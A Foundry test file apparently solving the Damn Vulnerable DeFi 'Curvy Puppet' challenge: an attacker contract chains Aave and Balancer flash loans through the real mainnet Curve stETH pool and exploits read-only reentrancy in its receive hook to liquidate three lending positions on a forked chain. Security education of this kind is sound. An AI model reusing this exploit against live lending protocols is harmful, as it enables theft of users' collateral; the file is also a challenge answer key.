// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {
    CurvyPuppetLending
} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IAaveV2 {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract CurvyPuppetAttacker {
    IAaveV2 constant AAVE_V2 =
        IAaveV2(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IBalancerVault constant BALANCER =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IStableSwap constant CURVE_POOL =
        IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    WETH constant WETH_TOKEN =
        WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 constant STETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IPermit2 constant PERMIT2 =
        IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    uint256 constant AAVE_STETH_FL = 172_000e18;
    uint256 constant AAVE_WETH_FL = 20_500e18;
    uint256 constant BALANCER_WETH_FL = 37_991e18;
    uint256 constant ETH_TO_CURVE = 58_685e18;
    uint256 constant ETH_TO_STETH_SWAP = 12_963_923469069977697655;
    uint256 constant ETH_TO_WETH_FOR_AAVE = 20_518e18;

    CurvyPuppetLending public immutable lending;
    address public immutable treasury;
    IERC20 public immutable lpToken;
    IERC20 public immutable dvt;
    address immutable alice;
    address immutable bob;
    address immutable charlie;

    constructor(
        CurvyPuppetLending _lending,
        address _treasury,
        address _alice,
        address _bob,
        address _charlie
    ) {
        lending = _lending;
        treasury = _treasury;
        lpToken = IERC20(_lending.borrowAsset());
        dvt = IERC20(_lending.collateralAsset());
        alice = _alice;
        bob = _bob;
        charlie = _charlie;
    }

    function attack() external {
        // The liquidations pull LP tokens through Permit2.
        lpToken.approve(address(PERMIT2), type(uint256).max);
        PERMIT2.approve(
            address(lpToken),
            address(lending),
            type(uint160).max,
            type(uint48).max
        );

        // Aave will pull the repayment at the end of executeOperation.
        STETH.approve(address(AAVE_V2), type(uint256).max);
        WETH_TOKEN.approve(address(AAVE_V2), type(uint256).max);

        // Aave has enough stETH, but not quite enough WETH for the whole move.
        address[] memory assets = new address[](2);
        assets[0] = address(STETH);
        assets[1] = address(WETH_TOKEN);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = AAVE_STETH_FL;
        amounts[1] = AAVE_WETH_FL;

        uint256[] memory modes = new uint256[](2);
        AAVE_V2.flashLoan({
            receiverAddress: address(this),
            assets: assets,
            amounts: amounts,
            modes: modes,
            onBehalfOf: address(this),
            params: "",
            referralCode: 0
        });

        _sendAllToTreasury();
    }

    function executeOperation(
        address[] memory,
        uint256[] memory,
        uint256[] memory,
        address,
        bytes memory
    ) external returns (bool) {
        require(msg.sender == address(AAVE_V2), "not aave");

        // Borrow the remaining WETH from Balancer while the Aave loan is open.
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH_TOKEN);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = BALANCER_WETH_FL;

        BALANCER.flashLoan(address(this), tokens, amounts, "");

        // Rebalance leftovers so the Aave repayment has enough of both assets.
        CURVE_POOL.exchange{value: ETH_TO_STETH_SWAP}(
            0,
            1,
            ETH_TO_STETH_SWAP,
            1
        );
        WETH_TOKEN.deposit{value: ETH_TO_WETH_FOR_AAVE}();

        return true;
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amountsFL,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == address(BALANCER), "not balancer");
        require(tokens[0] == address(WETH_TOKEN), "bad token");

        // Most of the borrowed assets go into the Curve pool.
        WETH_TOKEN.withdraw(ETH_TO_CURVE);

        STETH.approve(address(CURVE_POOL), type(uint256).max);
        uint256[2] memory deps;
        deps[0] = ETH_TO_CURVE;
        deps[1] = STETH.balanceOf(address(this));
        CURVE_POOL.add_liquidity{value: ETH_TO_CURVE}(deps, 0);

        // Leave 3 LP tokens aside to repay the three user debts.
        uint256[2] memory mins;
        uint256 lpToBurn = lpToken.balanceOf(address(this)) - 3e18 - 1;
        lpToken.approve(address(CURVE_POOL), lpToBurn);
        CURVE_POOL.remove_liquidity(lpToBurn, mins);

        WETH_TOKEN.deposit{value: amountsFL[0] + feeAmounts[0]}();
        WETH_TOKEN.transfer(address(BALANCER), amountsFL[0] + feeAmounts[0]);
    }

    receive() external payable {
        if (msg.sender == address(CURVE_POOL)) {
            // Curve sends ETH before its accounting is fully settled.
            lending.liquidate(alice);
            lending.liquidate(bob);
            lending.liquidate(charlie);
        }
    }

    function _sendAllToTreasury() private {
        // Anything left belongs back in the treasury.
        uint256 wethBalance = WETH_TOKEN.balanceOf(address(this));
        if (wethBalance != 0) WETH_TOKEN.transfer(treasury, wethBalance);

        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            WETH_TOKEN.deposit{value: ethBalance}();
            WETH_TOKEN.transfer(treasury, WETH_TOKEN.balanceOf(address(this)));
        }

        uint256 lpBalance = lpToken.balanceOf(address(this));
        if (lpBalance != 0) lpToken.transfer(treasury, lpBalance);

        uint256 dvtBalance = dvt.balanceOf(address(this));
        if (dvtBalance != 0) dvt.transfer(treasury, dvtBalance);

        uint256 stETHBalance = STETH.balanceOf(address(this));
        if (stETHBalance != 0) STETH.transfer(treasury, stETHBalance);
    }
}

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    IPermit2 constant permit2 =
        IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool =
        IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth =
        WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy the local pieces around the real Curve pool.
        dvt = new DamnValuableToken();
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({
            asset: ETH,
            value: ETHER_PRICE,
            expiration: block.timestamp + 1 days
        });
        oracle.setPrice({
            asset: address(dvt),
            value: DVT_PRICE,
            expiration: block.timestamp + 1 days
        });

        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // The challenge gives the player access to treasury funds, not ownership.
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8);
        IERC20(curvePool.lp_token()).transfer(
            address(lending),
            LENDER_INITIAL_LP_BALANCE
        );
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Each user starts overcollateralized at the honest LP price.
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            _openPositionFor(users[i]);
        }
    }

    function _openPositionFor(address who) private {
        vm.startPrank(who);
        address collateralAsset = lending.collateralAsset();
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    function test_assertInitialState() public view {
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(
            IERC20(curvePool.lp_token()).balanceOf(treasury),
            TREASURY_LP_BALANCE
        );

        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);
            assertGt(
                lending.getCollateralValue(collateralAmount) /
                    lending.getBorrowValue(borrowAmount),
                3
            );
        }
    }

    function test_curvyPuppet() public checkSolvedByPlayer {
        CurvyPuppetAttacker attacker = new CurvyPuppetAttacker(
            lending,
            treasury,
            alice,
            bob,
            charlie
        );

        // Use the treasury allowance granted during setup.
        weth.transferFrom(treasury, address(attacker), TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).transferFrom(
            treasury,
            address(attacker),
            TREASURY_LP_BALANCE
        );

        attacker.attack();
    }

    function _isSolved() private view {
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(
                lending.getCollateralAmount(users[i]),
                0,
                "User position still has collateral assets"
            );
            assertEq(
                lending.getBorrowAmount(users[i]),
                0,
                "User position still has borrowed assets"
            );
        }

        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(
            IERC20(curvePool.lp_token()).balanceOf(treasury),
            0,
            "Treasury doesn't have any LP tokens left"
        );
        assertEq(
            dvt.balanceOf(treasury),
            USER_INITIAL_COLLATERAL_BALANCE * 3,
            "Treasury doesn't have the users' DVT"
        );

        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(
            IERC20(curvePool.lp_token()).balanceOf(player),
            0,
            "Player still has LP tokens"
        );
    }
}
